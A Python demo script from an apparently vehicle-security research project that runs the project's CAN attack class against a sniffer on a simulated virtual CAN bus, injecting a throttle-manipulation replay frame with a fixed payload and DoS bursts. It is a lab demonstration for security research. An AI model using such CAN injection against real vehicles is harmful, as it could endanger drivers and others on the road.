"""
Standalone Windows CAN attack demo for CARLASec.

Runs the repo's own attacker code (attacker.can_attack.CANAttack) against a
listening sniffer, entirely over the Windows-compatible UDP CAN bus provided by
win_can_shim (auto-loaded via the venv .pth). No CARLA, no Linux, no hardware.

    python win_can_demo.py

You should see the sniffer capture the injected throttle-manipulation and DoS
frames -- the same CAN-layer behaviour README sections 6-7 rely on, minus the
Linux SocketCAN requirement.
"""
import time
import multiprocessing as mp


def _sniffer(ready, seconds=8):
    import can  # shim auto-loaded via .pth
    bus = can.interface.Bus(channel="vcan0", bustype="socketcan")
    ready.set()
    end = time.time() + seconds
    n = 0
    while time.time() < end:
        msg = bus.recv(timeout=1.0)
        if msg is not None:
            n += 1
            kind = "DoS" if msg.arbitration_id == 0 else "throttle-replay"
            print(f"[sniffer] #{n:<2} {kind:<15} id={hex(msg.arbitration_id)} data={msg.data.hex()}", flush=True)
    print(f"[sniffer] captured {n} attack frames total", flush=True)
    bus.shutdown()


def _attacker(ready):
    from attacker.can_attack import CANAttack  # repo's real attack code
    ready.wait(timeout=5)
    time.sleep(0.5)
    atk = CANAttack("vcan0", attack_type="can_dos", time_of_attack=(0, 5, 0, 0.2))
    print("[attacker] injecting throttle-manipulation replay (README payload)...", flush=True)
    for _ in range(5):
        atk.replay_attack(0x1A0, bytes.fromhex("5508010100000012"))
        time.sleep(0.2)
    print("[attacker] injecting CAN DoS burst...", flush=True)
    for _ in range(5):
        atk.dos_attack()
        time.sleep(0.2)
    print("[attacker] done", flush=True)
    atk.bus.shutdown()


if __name__ == "__main__":
    mp.freeze_support()
    ready = mp.Event()
    s = mp.Process(target=_sniffer, args=(ready,))
    a = mp.Process(target=_attacker, args=(ready,))
    s.start()
    a.start()
    a.join()
    s.join()
